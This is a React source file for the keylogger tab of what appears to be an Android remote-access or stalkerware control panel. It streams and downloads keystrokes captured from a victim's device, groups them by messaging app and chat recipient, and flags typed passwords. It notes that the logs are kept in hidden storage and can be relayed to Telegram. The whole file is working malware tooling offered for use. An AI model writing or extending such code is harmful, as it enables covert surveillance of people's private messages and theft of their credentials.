import React, { useState, useEffect, useRef, useCallback, useMemo } from 'react';
import { formatDateTime } from '../utils/dateTime.js';

const APP_COLORS = {
  'com.whatsapp': '#25D366',
  'com.instagram.android': '#E1306C',
  'com.facebook.katana': '#1877F2',
  'org.telegram.messenger': '#0088cc',
  'com.snapchat.android': '#FFFC00',
  'com.zhiliaoapp.musically': '#010101',
  'com.twitter.android': '#1DA1F2',
  'com.facebook.orca': '#0099FF',
  'com.google.android.gm': '#EA4335',
};

function getAppColor(pkg) {
  return APP_COLORS[pkg] || '#7c3aed';
}

function getAppShortName(pkg) {
  if (!pkg) return '?';
  const parts = pkg.split('.');
  return parts[parts.length - 1]?.slice(0, 2).toUpperCase() || '??';
}

/**
 * Per-day keylog files are JSONL — one entry object per line. Falls back to raw
 * text lines when a line is not valid JSON so a partially written file still
 * renders instead of coming up empty.
 */
function parseJsonl(raw) {
  const lines = (raw || '').split('\n').filter(l => l.trim().length > 0);
  const entries = [];
  for (const line of lines) {
    try {
      const obj = JSON.parse(line);
      entries.push(typeof obj === 'object' && obj !== null ? obj : { text: String(obj) });
    } catch (_) {
      return { parsed: false, entries: lines.map(l => ({ text: l })) };
    }
  }
  return { parsed: true, entries };
}

function decodeBase64(b64) {
  const binary = atob(b64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
  return new TextDecoder('utf-8').decode(bytes);
}

/**
 * One feed row, memoized on the entry object itself. The parent rebuilds the
 * row objects on every push, but keeps the *reference* of untouched rows, so
 * React skips re-rendering them instead of repainting the whole feed.
 */
const KeylogRow = React.memo(function KeylogRow({ entry }) {
  const pkg = entry.packageName || '';
  const color = getAppColor(pkg);
  return (
    <div className="kl-entry">
      <div
        className="kl-app-badge"
        style={{ background: color + '22', borderColor: color + '66', color }}
      >
        {getAppShortName(pkg)}
      </div>
      <div className="kl-entry-body">
        <span className="kl-app-name">{(entry.appName || pkg || '').split('.').pop()}</span>
        {entry.screenTitle && (
          <span title="Recipient / chat context" style={{ fontSize: 11, background: '#3b82f622', color: '#60a5fa', border: '1px solid #3b82f666', borderRadius: 4, padding: '1px 6px', marginRight: 4, fontWeight: 600 }}>→ {entry.screenTitle}</span>
        )}
        {(entry.isPassword === true || entry.isPassword === 'true' || entry.eventType === 'PASSWORD_FOCUS') && (
          <span title={entry.fieldType || 'password field'} style={{ fontSize: 11, background: '#ef444422', color: '#ef4444', border: '1px solid #ef444466', borderRadius: 4, padding: '1px 5px', marginRight: 4, fontWeight: 700, letterSpacing: 0.5 }}>🔑 PWD</span>
        )}
        <span className="kl-text">{entry.text ?? entry.content ?? entry.typedText ?? ''}</span>
      </div>
      <div className="kl-ts">{formatDateTime(entry.timestamp, '')}</div>
    </div>
  );
});

export default function KeyloggerTab({ device, sendCommand, results, keylogPushEntries }) {
  const deviceId  = device.deviceId;
  const isOnline  = device.isOnline;

  const [storedLogs, setStoredLogs]   = useState([]);
  const [keylogFiles, setKeylogFiles] = useState([]);
  const [loading, setLoading]         = useState(false);
  const [filterPkg, setFilterPkg]     = useState('');
  const [autoScroll, setAutoScroll]   = useState(true);
  const [viewMode, setViewMode]       = useState('live');
  const feedRef = useRef(null);
  const stickToTopRef = useRef(true);
  const seenResultIds = useRef(new Set());

  // Single-file viewer window. `date` is the file being shown; `raw` keeps the
  // decoded text so the modal can offer its own Download button.
  const [fileView, setFileView]   = useState(null);
  const [viewBusy, setViewBusy]   = useState(false);
  const [viewFilter, setViewFilter] = useState('');
  const pendingViewDate = useRef(null);

  const downloadText = (raw, filename) => {
    const blob = new Blob([raw], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
  };

  const downloadBase64Text = (b64, filename) => {
    downloadText(decodeBase64(b64), filename);
  };

  useEffect(() => {
    // A timed-out/failed request carries no response — clear the pending viewer
    // marker so it can't latch onto the next unrelated download_keylog_file.
    results.forEach(r => {
      if (r.command !== 'download_keylog_file' || r.success) return;
      if (seenResultIds.current.has(r.id)) return;
      seenResultIds.current.add(r.id);
      const pendingDate = pendingViewDate.current;
      if (!pendingDate) return;
      pendingViewDate.current = null;
      setViewBusy(false);
      setFileView({ date: pendingDate, error: r.error || 'Request failed or timed out' });
    });

    const relevant = results.filter(r =>
      (r.command === 'get_keylogs' || r.command === 'list_keylog_files' || r.command === 'download_keylog_file') &&
      r.success && r.response
    );
    relevant.forEach(r => {
      if (seenResultIds.current.has(r.id)) return;
      seenResultIds.current.add(r.id);
      try {
        const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
        if (r.command === 'get_keylogs') {
          const logs = data.logs || data.entries || data.keylogs || data.keylogEntries || data.data;
          if (Array.isArray(logs)) setStoredLogs(logs);
        }
        if (r.command === 'list_keylog_files' && data.files) {
          setKeylogFiles(data.files);
        }
        if (r.command === 'download_keylog_file') {
          // The same command backs both Download and View. When a view request
          // is pending for this exact date, render it in its own window instead
          // of saving it to disk.
          if (pendingViewDate.current && pendingViewDate.current === data.date) {
            pendingViewDate.current = null;
            setViewBusy(false);
            if (data.base64) {
              const raw = decodeBase64(data.base64);
              const { parsed, entries } = parseJsonl(raw);
              setFileView({
                date: data.date,
                raw,
                entries,
                parsed,
                size: data.size ?? raw.length,
              });
              setViewFilter('');
            } else {
              setFileView({ date: data.date, error: data.error || 'File is empty' });
            }
          } else if (data.base64) {
            downloadBase64Text(data.base64, `keylogs_${data.date}.txt`);
          }
        }
      } catch (_) {}
    });
  }, [results]);

  // Load the device's persisted logs as soon as this tab is opened. Live SSE
  // events are not guaranteed to include entries captured before the tab
  // mounted, and waiting for the operator to press Refresh made the feed look
  // empty even though the APK had stored the logs successfully.
  useEffect(() => {
    if (isOnline) sendCommand(deviceId, 'get_keylogs', { limit: 500 });
  }, [deviceId, isOnline, sendCommand]);

  const fetchLiveLogs = useCallback(() => {
    setLoading(true);
    sendCommand(deviceId, 'get_keylogs', { limit: 500 });
    setTimeout(() => setLoading(false), 1500);
  }, [deviceId, sendCommand]);

  const fetchFiles = useCallback(() => {
    sendCommand(deviceId, 'list_keylog_files', {});
  }, [deviceId, sendCommand]);

  // Keylogs arrive via push events (keylog:push) from the Android app in real time.
  // File listing and keylog fetching are triggered manually via buttons.

  // Rows are rebuilt whenever a push arrives, but every row whose content did
  // not change is reused from this cache so its object identity — and therefore
  // its <KeylogRow> memo — stays intact. Without this, each new keystroke would
  // hand React a fresh object for the entire feed and repaint every row, which
  // reads as the UI flashing on every update.
  const rowCacheRef = useRef(new Map());

  const combinedLogs = useMemo(() => {
    const cache = rowCacheRef.current;
    const seen = new Set();
    const rows = [];
    for (const src of [...(keylogPushEntries || []), ...storedLogs]) {
      if (!src || typeof src !== 'object') continue;
      const text = src.text ?? src.content ?? src.typedText ?? '';
      const sig = `${src.packageName || src.package || ''}|${src.timestamp || src.postTime || src.time || ''}|${text}`;
      if (seen.has(sig)) continue;
      seen.add(sig);
      let row = cache.get(sig);
      if (!row || row.eventType !== (src.eventType || '') || row.screenTitle !== src.screenTitle) {
        row = { ...src, text, _k: sig };
        cache.set(sig, row);
      }
      rows.push(row);
    }
    // Keep the cache from growing without bound on long-running sessions.
    if (cache.size > rows.length * 2 + 500) {
      const keep = new Set(rows.slice(0, rows.length).map(r => r._k));
      for (const k of cache.keys()) if (!keep.has(k)) cache.delete(k);
    }
    return rows;
  }, [keylogPushEntries, storedLogs]);

  const filtered = useMemo(() => filterPkg
    ? combinedLogs.filter(l => (l.packageName || '').includes(filterPkg))
    : combinedLogs,
  [combinedLogs, filterPkg]);

  const pkgList = useMemo(() =>
    [...new Set(combinedLogs.map(l => l.packageName).filter(Boolean))],
  [combinedLogs]);

  // Entries arrive newest-first, so auto-scroll pins the container to the top.
  // It only does so while the reader is already near the top, so scrolling back
  // through history is not yanked away by incoming events.
  const onFeedScroll = useCallback(() => {
    const el = feedRef.current;
    if (el) stickToTopRef.current = el.scrollTop <= 24;
  }, []);

  useEffect(() => {
    if (!autoScroll || !stickToTopRef.current) return;
    const el = feedRef.current;
    if (!el) return;
    if (el.scrollTop === 0) return;
    el.scrollTop = 0;
  }, [filtered.length, autoScroll]);

  const downloadDay = (date) => {
    // Clearing the pending-view marker guarantees this response is saved to
    // disk even if a viewer window for the same day is still in flight.
    pendingViewDate.current = null;
    sendCommand(deviceId, 'download_keylog_file', { date });
  };

  // Fetches that single day's file and opens it in its own viewer window.
  const openFileView = (date) => {
    pendingViewDate.current = date;
    setViewBusy(true);
    sendCommand(deviceId, 'download_keylog_file', { date });
  };

  const closeFileView = () => {
    pendingViewDate.current = null;
    setViewBusy(false);
    setFileView(null);
    setViewFilter('');
  };

  useEffect(() => {
    if (!fileView) return;
    const onKey = e => { if (e.key === 'Escape') closeFileView(); };
    window.addEventListener('keydown', onKey);
    return () => window.removeEventListener('keydown', onKey);
  }, [fileView]);

  const viewEntries = useMemo(() => {
    if (!fileView?.entries) return [];
    const q = viewFilter.trim().toLowerCase();
    if (!q) return fileView.entries;
    return fileView.entries.filter(e =>
      `${e.appName || ''} ${e.packageName || ''} ${e.eventType || ''} ${e.text ?? e.content ?? ''}`
        .toLowerCase().includes(q));
  }, [fileView, viewFilter]);

  return (
    <div className="keylogger-tab">
      <div className="kl-toolbar">
        <div className="kl-view-tabs">
          <button className={`kl-vtab ${viewMode === 'live' ? 'active' : ''}`} onClick={() => setViewMode('live')}>
            ⌨️ Live Feed
          </button>
          <button className={`kl-vtab ${viewMode === 'files' ? 'active' : ''}`} onClick={() => { setViewMode('files'); fetchFiles(); }}>
            📁 Files
          </button>
        </div>
        <div className="kl-actions">
          {viewMode === 'live' && (
            <>
              <select
                value={filterPkg}
                onChange={e => setFilterPkg(e.target.value)}
                className="kl-filter-select"
              >
                <option value="">All Apps</option>
                {pkgList.map(p => <option key={p} value={p}>{p.split('.').pop()}</option>)}
              </select>
              <label className="kl-autoscroll">
                <input type="checkbox" checked={autoScroll} onChange={e => setAutoScroll(e.target.checked)} />
                Auto-scroll
              </label>
              <button className="kl-btn" onClick={fetchLiveLogs} disabled={!isOnline || loading}>
                {loading ? '…' : '↻ Refresh'}
              </button>
              <button className="kl-btn kl-btn-danger" onClick={() => {
                sendCommand(deviceId, 'clear_keylogs', {});
                setStoredLogs([]);
              }} disabled={!isOnline}>
                🧹 Clear
              </button>
            </>
          )}
        </div>
      </div>

      {viewMode === 'live' && (
        <div className="kl-feed-wrapper">
          <div className="kl-stats">
            <span>{filtered.length} entries</span>
            {keylogPushEntries?.length > 0 && (
              <span style={{ color: '#22d3ee', fontSize: 11, marginLeft: 8 }}>
                ● {keylogPushEntries.length} live
              </span>
            )}
            {filterPkg && <span style={{ color: '#7c3aed' }}>· Filtered: {filterPkg}</span>}
            <span style={{ marginLeft: 'auto', display: 'flex', alignItems: 'center', gap: 10 }}>
              <span style={{ fontSize: 11, color: '#94a3b8' }}>Stored per-day in hidden internal storage • Downloads by file</span>
              <span title="Live keylogger Telegram streaming — configure in Notifications tab" style={{
                fontSize: 10, fontWeight: 600, color: '#a78bfa',
                background: 'rgba(124,58,237,0.12)', border: '1px solid rgba(124,58,237,0.3)',
                borderRadius: 6, padding: '2px 7px', cursor: 'default',
              }}>
                ✈️ Telegram stream → Notifications tab
              </span>
            </span>
          </div>
          <div className="kl-feed" ref={feedRef} onScroll={onFeedScroll}>
            {filtered.length === 0 && (
              <div className="kl-empty">
                <div style={{ fontSize: 40 }}>⌨️</div>
                <div>No keylog entries</div>
                <div style={{ fontSize: 12, color: '#64748b' }}>
                  {isOnline ? 'Waiting for keystrokes…' : 'Device is offline'}
                </div>
              </div>
            )}
            {filtered.map(entry => <KeylogRow key={entry._k} entry={entry} />)}
          </div>
        </div>
      )}

      {viewMode === 'files' && (
        <div className="kl-files-view">
          <div className="kl-files-header">
            <span>📁 Keylog Files ({keylogFiles.length} days)</span>
            <button className="kl-btn" onClick={fetchFiles} disabled={!isOnline}>↻</button>
          </div>
          {keylogFiles.length === 0 ? (
            <div className="kl-empty">
              <div style={{ fontSize: 32 }}>📁</div>
              <div>No keylog files yet</div>
            </div>
          ) : (
            <div className="kl-file-list">
              {keylogFiles.map(f => (
                <div key={f.date || f.name} className="kl-file-item">
                  <div className="kl-file-icon">📄</div>
                  <div className="kl-file-info">
                    <div className="kl-file-date">{f.date || f.name}</div>
                    <div className="kl-file-size">{f.size ? (f.size / 1024).toFixed(1) + ' KB' : '—'}</div>
                  </div>
                  <div className="kl-file-actions">
                    <button
                      className="kl-btn kl-btn-dl"
                      onClick={() => downloadDay(f.date || f.name)}
                      disabled={!isOnline}
                      title="Download as text file"
                    >
                      ⬇ Download
                    </button>
                    <button
                      className="kl-btn"
                      onClick={() => openFileView(f.date || f.name)}
                      disabled={!isOnline || viewBusy}
                      title="Open this file in a viewer window"
                    >
                      {viewBusy && pendingViewDate.current === (f.date || f.name) ? '…' : '👁 View'}
                    </button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* Single-file viewer — shows only the selected day's keylog file */}
      {(fileView || viewBusy) && (
        <div className="kl-file-modal" onMouseDown={e => { if (e.target === e.currentTarget) closeFileView(); }}>
          <div className="kl-file-modal-box">
            <div className="kl-file-modal-head">
              <span className="kl-file-modal-title">📄 {fileView?.date || 'Loading…'}</span>
              {fileView?.size != null && (
                <span className="kl-file-modal-meta">
                  {(fileView.size / 1024).toFixed(1)} KB · {viewEntries.length}
                  {viewFilter.trim() ? ` / ${fileView.entries.length}` : ''} entries
                  {fileView.parsed ? '' : ' • raw'}
                </span>
              )}
              <button className="kl-btn" onClick={closeFileView} title="Close (Esc)">✕</button>
            </div>

            {viewBusy && !fileView ? (
              <div className="kl-file-modal-body kl-empty">
                <div style={{ fontSize: 32 }}>⏳</div>
                <div>Fetching file from device…</div>
              </div>
            ) : fileView?.error ? (
              <div className="kl-file-modal-body kl-empty">
                <div style={{ fontSize: 32 }}>⚠️</div>
                <div>{fileView.error}</div>
              </div>
            ) : (
              <>
                <div className="kl-file-modal-tools">
                  <input
                    className="kl-file-modal-search"
                    placeholder="Search this file…"
                    value={viewFilter}
                    onChange={e => setViewFilter(e.target.value)}
                    autoFocus
                  />
                </div>
                <div className="kl-file-modal-body">
                  {viewEntries.length === 0 ? (
                    <div className="kl-empty">
                      <div style={{ fontSize: 32 }}>🔍</div>
                      <div>{viewFilter.trim() ? 'No matching entries' : 'This file is empty'}</div>
                    </div>
                  ) : (
                    viewEntries.map((entry, i) => (
                      <div key={`${entry.timestamp}-${entry.packageName}-${i}`} className="kl-entry">
                        <div
                          className="kl-app-badge"
                          style={{ background: getAppColor(entry.packageName) + '22', borderColor: getAppColor(entry.packageName) + '66', color: getAppColor(entry.packageName) }}
                        >
                          {getAppShortName(entry.packageName)}
                        </div>
                        <div className="kl-entry-body">
                          <span className="kl-app-name">{(entry.appName || entry.packageName || '—').split('.').pop()}</span>
                          {entry.eventType && (
                            <span className="kl-file-event-type">{entry.eventType}</span>
                          )}
                          {entry.screenTitle && (
                            <span title="Recipient / chat context" style={{ fontSize: 11, background: '#3b82f622', color: '#60a5fa', border: '1px solid #3b82f666', borderRadius: 4, padding: '1px 6px', marginRight: 4, fontWeight: 600 }}>→ {entry.screenTitle}</span>
                          )}
                          {entry.eventType === 'PASSWORD_FOCUS' && (
                            <span style={{ fontSize: 11, background: '#ef444422', color: '#ef4444', border: '1px solid #ef444466', borderRadius: 4, padding: '1px 5px', marginRight: 4, fontWeight: 700, letterSpacing: 0.5 }}>🔑 PWD</span>
                          )}
                          <span className="kl-text kl-text-wrap">{entry.text ?? entry.content ?? entry.typedText ?? ''}</span>
                        </div>
                        <div className="kl-ts">{entry.timestamp || '—'}</div>
                      </div>
                    ))
                  )}
                </div>
                <div className="kl-file-modal-foot">
                  <span className="kl-file-modal-meta">Viewing keylogs_{fileView?.date}.txt only</span>
                  <div className="kl-file-modal-foot-actions">
                    <button
                      className="kl-btn kl-btn-dl"
                      disabled={!fileView?.raw}
                      onClick={() => fileView?.raw && downloadText(fileView.raw, `keylogs_${fileView.date}.txt`)}
                    >
                      ⬇ Download this file
                    </button>
                    <button className="kl-btn" onClick={closeFileView}>Close</button>
                  </div>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
